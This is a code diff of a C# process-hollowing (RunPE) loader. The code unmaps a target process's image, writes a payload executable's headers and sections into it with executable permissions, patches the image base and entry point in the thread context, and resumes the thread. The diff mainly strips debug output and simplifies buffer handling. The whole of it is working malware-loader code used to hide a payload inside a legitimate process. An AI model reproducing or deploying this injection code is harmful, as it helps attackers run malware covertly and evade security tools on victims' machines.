@@ -17,8 +17,6 @@ namespace ConsoleApplication1
         [DllImport("kernel32.dll")]
         private static extern bool WriteProcessMemory(IntPtr hProc, IntPtr addr, byte[] data, int size, out int written);
         [DllImport("kernel32.dll")]
-        private static extern bool WriteProcessMemory(IntPtr hProc, IntPtr addr, IntPtr data, int size, out int written);
-        [DllImport("kernel32.dll")]
         private static extern void TerminateProcess(IntPtr hProcess, uint exitCode);
         [DllImport("kernel32.dll")]
         private static extern void ResumeThread(IntPtr hThread);
@@ -69,31 +67,18 @@ namespace ConsoleApplication1
             // read payload details
             int e_lfanew = Marshal.ReadInt32(payload, 0x3c);
             short sizeOfOptionalHeader = Marshal.ReadInt16(payload, e_lfanew + 0x14);
-            Console.WriteLine("Size of optional header: {0}", sizeOfOptionalHeader);
-
             short numberOfSections = Marshal.ReadInt16(payload, e_lfanew + 0x6);
-            Console.WriteLine("Number of sections: {0}", numberOfSections);
-
             int sizeOfImage = Marshal.ReadInt32(payload, e_lfanew + 0x50);
-            Console.WriteLine("Size of image: {0}", sizeOfImage);
-
             int sizeOfHeaders = Marshal.ReadInt32(payload, e_lfanew + 0x54);
-            Console.WriteLine("Size of headers: {0}", sizeOfHeaders);
-
             int locationOfSectionHeaders = e_lfanew + 0x14 /*file header size*/ + sizeof(int) /*e_lfanew size*/ + sizeOfOptionalHeader;
-            Console.WriteLine("Location of section headers: {0}", locationOfSectionHeaders.ToString("x8"));
-
             int imageBase = Marshal.ReadInt32(payload, e_lfanew + 0x34);
-            Console.WriteLine("Image base: {0}", imageBase);
-
             int addressOfEntrypoint = Marshal.ReadInt32(payload, e_lfanew + 0x28);
-            Console.WriteLine("Entry point: {0}", addressOfEntrypoint);
 
             // unmap a view of memory 
             NtUnmapViewOfSection(hProcess, (IntPtr)imageBase);
 
             // allocate space at target process location (our normal payload imagebase)
-            VirtualAllocEx(hProcess, (IntPtr)imageBase, sizeOfImage, 0x3000, 0x40);
+            VirtualAllocEx(hProcess, (IntPtr)imageBase, sizeOfImage, 0x3000, 0x40 );
 
             // write our payload headers
             WriteProcessMemory(hProcess, (IntPtr)imageBase, payload, sizeOfHeaders, out written);
@@ -109,13 +94,12 @@ namespace ConsoleApplication1
                 int rva = Marshal.ReadInt32(sectionHeader, 0x8 + 0x4);
                 int rawsize = Marshal.ReadInt32(sectionHeader, 0x8 + 0x8);
                 int rawaddress = Marshal.ReadInt32(sectionHeader, 0x8 + 0xc);
-                Console.WriteLine("RVA: {0}, Size: {1}, Raw data ptr: {2}", rva.ToString("x8"), rawsize.ToString("x8"), rawaddress.ToString("x8"));
+                int virtualsize = Marshal.ReadInt32(sectionHeader, 0x8);
 
                 // write to baseaddress+rva -> raw data, + size
-                IntPtr data = Marshal.AllocHGlobal(rawsize);
-                RtlZeroMemory(data, rawsize);
+                byte[] data = new byte[rawsize];
 
-                Marshal.Copy(payload, rawaddress, data, rawsize);
+                Buffer.BlockCopy(payload, rawaddress, data, 0, rawsize);
                 WriteProcessMemory(hProcess, (IntPtr)imageBase + rva, data, rawsize, out written);
             }
 
@@ -137,13 +121,8 @@ namespace ConsoleApplication1
             }
             int ebx = Marshal.ReadInt32(threadContext, 0xa4);
 
-            Console.WriteLine("Ebx: {0}", ebx.ToString("x8"));
-
-            // store our imagebase to a buffer
-            IntPtr newImageBase = Marshal.AllocHGlobal(0x4);
-            Marshal.WriteInt32(newImageBase, imageBase);
-
             // patch the imagebase of our process
+            byte[] newImageBase = BitConverter.GetBytes(imageBase);
             WriteProcessMemory(hProcess, (IntPtr)ebx + 8, newImageBase, 0x4, out written);
 
             // patch eax with our entrypoint
@@ -158,7 +137,6 @@ namespace ConsoleApplication1
             {
                 SetThreadContext(hThread, threadContext);
             }
-
 
             // resume the thread
             ResumeThread(hThread);
